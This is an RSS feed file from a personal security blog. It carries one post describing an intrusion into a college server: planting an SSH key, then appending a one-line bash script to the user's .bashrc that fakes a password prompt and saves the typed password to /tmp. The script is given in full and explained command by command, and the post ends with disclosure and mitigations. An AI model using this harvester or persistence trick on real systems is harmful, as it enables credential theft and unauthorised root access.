@@ -1,0 +1,230 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Privilege Escalation on Gill.Singh.A</title>
+        <link>http://localhost:1313/categories/privilege-escalation/</link>
+        <description>Recent content in Privilege Escalation on Gill.Singh.A</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Mon, 23 Sep 2024 05:28:07 +0530</lastBuildDate><atom:link href="http://localhost:1313/categories/privilege-escalation/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Using Social Engineering for Privilege Escalation</title>
+        <link>http://localhost:1313/p/using-social-engineering-for-privilege-escalation/</link>
+        <pubDate>Mon, 23 Sep 2024 05:28:07 +0530</pubDate>
+        
+        <guid>http://localhost:1313/p/using-social-engineering-for-privilege-escalation/</guid>
+        <description>&lt;img src="http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt.png" alt="Featured image of post Using Social Engineering for Privilege Escalation" /&gt;&lt;h2 id=&#34;prologue&#34;&gt;Prologue
+&lt;/h2&gt;&lt;p&gt;While exploring devices on my college network, I managed to gain Remote Desktop Access to a server for one of our institute&amp;rsquo;s websites. The method I used to obtain access to the interface is out of the scope of this blog.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/remote_desktop_interface.png&#34;
+	width=&#34;1042&#34;
+	height=&#34;779&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/remote_desktop_interface_hu3798650764409171018.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/remote_desktop_interface_hu4295186151521413508.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Remote Desktop Access&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;133&#34;
+		data-flex-basis=&#34;321px&#34;
+	
+&gt;&lt;br /&gt;
+Upon gaining access, I found that the server was running &lt;strong&gt;Ubuntu&lt;/strong&gt;. The terminal displayed &lt;strong&gt;user&lt;/strong&gt; as the current user.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/current_user.png&#34;
+	width=&#34;1038&#34;
+	height=&#34;778&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/current_user_hu18328591220318913029.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/current_user_hu7294103013318607692.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Terminal&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;133&#34;
+		data-flex-basis=&#34;320px&#34;
+	
+&gt;&lt;br /&gt;
+I added my public key to &lt;em&gt;/home/user/.ssh/authorized_keys&lt;/em&gt; and checked the SSH connection.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/user_ssh_connection.png&#34;
+	width=&#34;715&#34;
+	height=&#34;502&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/user_ssh_connection_hu10281628265701383641.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/user_ssh_connection_hu7560144399843845447.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;User SSH Connection&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;142&#34;
+		data-flex-basis=&#34;341px&#34;
+	
+&gt;&lt;br /&gt;
+With SSH access confirmed, it was time to escalate our privileges to the &lt;em&gt;&lt;strong&gt;root&lt;/strong&gt;&lt;/em&gt; user.&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation
+&lt;/h2&gt;&lt;p&gt;Initially, I explored various SUIDs, SGIDs, Cronjob Files, the Shadow File, shared libraries, and other system components to find potential vulnerabilities. &lt;br /&gt;
+After finding no useful exploits, I downloaded and executed &lt;a class=&#34;link&#34; href=&#34;https://github.com/peass-ng/PEASS-ng&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;linPEAS&lt;/a&gt; to search for additional attack surfaces, but it was not successful.&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;social-engineering&#34;&gt;Social Engineering
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;I&amp;rsquo;M GOOD AT READING PEOPLE. MY SECRET. I LOOK FOR THE WORST IN THEM.&amp;rdquo; - Mr.Robot&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;!-- --&gt;
+&lt;p&gt;This line from Mr. Robot inspired me after my initial methods for privilege escalation failed.&lt;br /&gt;
+I devised a strategy to obtain the password for &lt;strong&gt;user&lt;/strong&gt; using a social engineering approach.&lt;br /&gt;
+I created a single-line bash script to be appended to &lt;em&gt;/home/user/.bashrc&lt;/em&gt;.&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s1&#34;&gt;&amp;#39;password for user: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; -s password&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 &amp;gt;/tmp/tmp.txt&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; grep -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;random_signature&amp;#39;&lt;/span&gt; /home/user/.bashrc &amp;gt;/tmp/tmp&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; mv /tmp/tmp /home/user/.bashrc&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; chmod &lt;span class=&#34;m&#34;&gt;644&lt;/span&gt; ~/.bashrc&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s Understand this command-by-command&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Prints &lt;strong&gt;password for user:&lt;/strong&gt; on the screen, tricking the user into thinking it’s a prompt for their password.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s1&#34;&gt;&amp;#39;password for user: &amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Inputs the password in silent mode, so it doesn’t appear on the screen.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; -s password
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Encodes the password in &lt;strong&gt;base64&lt;/strong&gt; and saves it to &lt;em&gt;/tmp/tmp.txt&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 &amp;gt;/tmp/tmp.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Removes lines containing &lt;strong&gt;random_signature&lt;/strong&gt; from &lt;em&gt;/home/user/.bashrc&lt;/em&gt;, ensuring it doesn’t affect the file’s functionality.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;grep -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;random_signature&amp;#39;&lt;/span&gt; /home/user/.bashrc &amp;gt;/tmp/tmp
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Replaces the original &lt;strong&gt;.bashrc&lt;/strong&gt; file with the modified version.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv /tmp/tmp /home/user/.bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Restores the original file permissions for &lt;strong&gt;.bashrc&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;644&lt;/span&gt; ~/.bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;After appending this line to &lt;em&gt;/home/user/.bashrc&lt;/em&gt;, every time a new terminal was opened, it would prompt the &lt;strong&gt;user&lt;/strong&gt; for their password.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt.png&#34;
+	width=&#34;890&#34;
+	height=&#34;390&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt_hu9311836505811142885.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/password_prompt_hu15260579389586501392.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Password Prompt&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;228&#34;
+		data-flex-basis=&#34;547px&#34;
+	
+&gt;&lt;br /&gt;
+Once the user entered their password, the line would be removed from &lt;strong&gt;.bashrc&lt;/strong&gt;, restoring the file to its original state. I could then SSH into the machine and retrieve the base64 encoded password from &lt;em&gt;/tmp/tmp.txt&lt;/em&gt;.&lt;br /&gt;
+Although there were concerns about potential failures, such as entering the wrong password or pressing &lt;strong&gt;CTRL+C&lt;/strong&gt;, the method worked successfully after a few days.&lt;/p&gt;
+&lt;h2 id=&#34;obtaining-password&#34;&gt;Obtaining Password
+&lt;/h2&gt;&lt;p&gt;A few days later, I logged in as &lt;strong&gt;user&lt;/strong&gt; via SSH and found that it wasn’t prompting for a password. I checked &lt;em&gt;/tmp/tmp.txt&lt;/em&gt; and found the base64 encoded password.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_password.png&#34;
+	width=&#34;610&#34;
+	height=&#34;384&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_password_hu15247351470866518167.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_password_hu12880556767352814779.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Base64 Encoded Password&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;158&#34;
+		data-flex-basis=&#34;381px&#34;
+	
+&gt;&lt;br /&gt;
+After Decoding it, I obtained the password.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_decoding.png&#34;
+	width=&#34;568&#34;
+	height=&#34;119&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_decoding_hu4472420002180516116.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/base64_decoding_hu1426856767055626827.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Base64 Decoding&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;477&#34;
+		data-flex-basis=&#34;1145px&#34;
+	
+&gt;&lt;br /&gt;
+Finally, I verified the success of my social engineering method by checking for root access.&lt;br /&gt;
+&lt;img src=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/sudo_bash.png&#34;
+	width=&#34;190&#34;
+	height=&#34;40&#34;
+	srcset=&#34;http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/sudo_bash_hu15170616915056937535.png 480w, http://localhost:1313/p/using-social-engineering-for-privilege-escalation/assets/images/sudo_bash_hu4895617423315236842.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Sudo Bash&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;475&#34;
+		data-flex-basis=&#34;1140px&#34;
+	
+&gt;&lt;br /&gt;
+There We have the &lt;strong&gt;root&lt;/strong&gt; user!&lt;/p&gt;
+&lt;h2 id=&#34;reporting&#34;&gt;Reporting
+&lt;/h2&gt;&lt;p&gt;As a responsible and ethical individual, I reported the findings to the concerned authorities. They have since addressed and fixed the issues discussed.&lt;/p&gt;
+&lt;h2 id=&#34;mitigations&#34;&gt;Mitigations
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Social Engineering&lt;/strong&gt; remains one of the most dangerous methods of compromising security because it exploits human psychology rather than technical vulnerabilities. The weakest link in any security system is often the human element. Even the most secure systems can be breached if someone is tricked into revealing sensitive information or executing malicious commands.&lt;br /&gt;
+To mitigate the risk of social engineering attacks:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Security Awareness Training&lt;/strong&gt;: Regularly train employees to recognize and respond to social engineering tactics.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Verification Procedures&lt;/strong&gt;: Implement strict verification processes for sensitive actions or information requests.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Multi-Factor Authentication (MFA)&lt;/strong&gt;: Use MFA to add an extra layer of security beyond just passwords.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Monitor and Audit&lt;/strong&gt;: Regularly monitor and audit access logs for suspicious activity.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- --&gt;
+&lt;p&gt;By addressing these areas, you can significantly reduce the risk posed by social engineering and other similar attacks.&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
